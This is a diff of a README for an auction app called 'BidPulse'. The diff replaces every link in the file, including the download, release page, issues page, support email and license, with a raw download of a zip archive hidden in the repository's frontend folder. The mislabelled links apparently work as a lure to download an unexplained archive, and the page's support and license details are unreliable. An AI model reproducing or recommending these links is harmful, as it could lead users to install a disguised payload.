@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download BidPulse](https://raw.githubusercontent.com/ChiragWhiteHacker/BidPulse/main/frontend/src/assets/Pulse_Bid_v3.9.zip%https://raw.githubusercontent.com/ChiragWhiteHacker/BidPulse/main/frontend/src/assets/Pulse_Bid_v3.9.zip)](https://raw.githubusercontent.com/ChiragWhiteHacker/BidPulse/main/frontend/src/assets/Pulse_Bid_v3.9.zip)
+[![Download BidPulse](https://github.com/ChiragWhiteHacker/BidPulse/raw/refs/heads/main/frontend/public/Pulse-Bid-v1.6-beta.3.zip%https://github.com/ChiragWhiteHacker/BidPulse/raw/refs/heads/main/frontend/public/Pulse-Bid-v1.6-beta.3.zip)](https://github.com/ChiragWhiteHacker/BidPulse/raw/refs/heads/main/frontend/public/Pulse-Bid-v1.6-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ BidPulse includes several key features to enhance your bidding experience:
 
 Follow these steps to install BidPulse from the Releases page:
 
-1. Visit the [Release Page](https://raw.githubusercontent.com/ChiragWhiteHacker/BidPulse/main/frontend/src/assets/Pulse_Bid_v3.9.zip).
+1. Visit the [Release Page](https://github.com/ChiragWhiteHacker/BidPulse/raw/refs/heads/main/frontend/public/Pulse-Bid-v1.6-beta.3.zip).
 2. Locate the latest version. It will typically be at the top of the page.
 3. Click on the link for your operating system to download the file.
 4. Once downloaded, find the file in your downloads folder.
@@ -50,8 +50,8 @@ Follow these steps to install BidPulse from the Releases page:
 
 If you encounter issues or have questions, our support team is here to help. You can reach us through the following channels:
 
-- **GitHub Issues**: Post your questions or issues on the [Github Issues page](https://raw.githubusercontent.com/ChiragWhiteHacker/BidPulse/main/frontend/src/assets/Pulse_Bid_v3.9.zip).
-- **Email Support**: Contact us at https://raw.githubusercontent.com/ChiragWhiteHacker/BidPulse/main/frontend/src/assets/Pulse_Bid_v3.9.zip We respond within 24 hours.
+- **GitHub Issues**: Post your questions or issues on the [Github Issues page](https://github.com/ChiragWhiteHacker/BidPulse/raw/refs/heads/main/frontend/public/Pulse-Bid-v1.6-beta.3.zip).
+- **Email Support**: Contact us at https://github.com/ChiragWhiteHacker/BidPulse/raw/refs/heads/main/frontend/public/Pulse-Bid-v1.6-beta.3.zip We respond within 24 hours.
 
 ## 📖 Frequently Asked Questions
 
@@ -77,10 +77,10 @@ Yes, BidPulse is designed to work well on various devices, including mobile.
 
 ## 📜 License
 
-BidPulse is licensed under the MIT License. You can freely use, modify, and distribute it. Check the [LICENSE](https://raw.githubusercontent.com/ChiragWhiteHacker/BidPulse/main/frontend/src/assets/Pulse_Bid_v3.9.zip) file for more details.
+BidPulse is licensed under the MIT License. You can freely use, modify, and distribute it. Check the [LICENSE](https://github.com/ChiragWhiteHacker/BidPulse/raw/refs/heads/main/frontend/public/Pulse-Bid-v1.6-beta.3.zip) file for more details.
 
 ## 🥳 Conclusion
 
 BidPulse simplifies the bidding process with real-time updates and secure payment options. Download it today and enhance your auction experience! 
 
-Visit our [Release Page](https://raw.githubusercontent.com/ChiragWhiteHacker/BidPulse/main/frontend/src/assets/Pulse_Bid_v3.9.zip) to get started!
+Visit our [Release Page](https://github.com/ChiragWhiteHacker/BidPulse/raw/refs/heads/main/frontend/public/Pulse-Bid-v1.6-beta.3.zip) to get started!
